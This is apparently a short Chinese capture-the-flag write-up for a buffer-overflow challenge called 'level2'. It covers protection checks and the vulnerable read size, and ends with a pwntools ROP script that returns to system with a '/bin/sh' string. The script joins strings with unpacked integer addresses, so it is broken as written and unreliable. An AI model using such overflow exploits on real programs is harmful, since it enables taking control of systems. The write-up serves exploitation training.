首先查安全机制和架构

![image-20201102204244975](https://static.hack1s.fun/images/2021/02/06/image-20201102204244975.png)

运行一下效果就是输入一个字符串

![image-20201102204313538](https://static.hack1s.fun/images/2021/02/06/image-20201102204313538.png)

main函数的代码

![image-20201102204414050](https://static.hack1s.fun/images/2021/02/06/image-20201102204414050.png)

vulnerable 函数中的代码

![image-20201102204442374](https://static.hack1s.fun/images/2021/02/06/image-20201102204442374.png)

read了0x100，但是距离ebp只有0x88

由于开启了nx，应该也是用rop来做了

直接溢出，rop跳到system

![image-20201102204549168](https://static.hack1s.fun/images/2021/02/06/image-20201102204549168.png)

查找字符串还发现很贴心的给了`/bin/sh`

虽然这个字符串并没有调用的地方

```python
from pwn import *

io  = process('./level2')
elf = ELF('./level2')

payload = 'a'*0x88 + 'b'*0x4 + elf.sym['system'] + elf.sym['main'] + elf.sym['hint']

io.readline()
io.sendline(payload)

io.interactive()
```



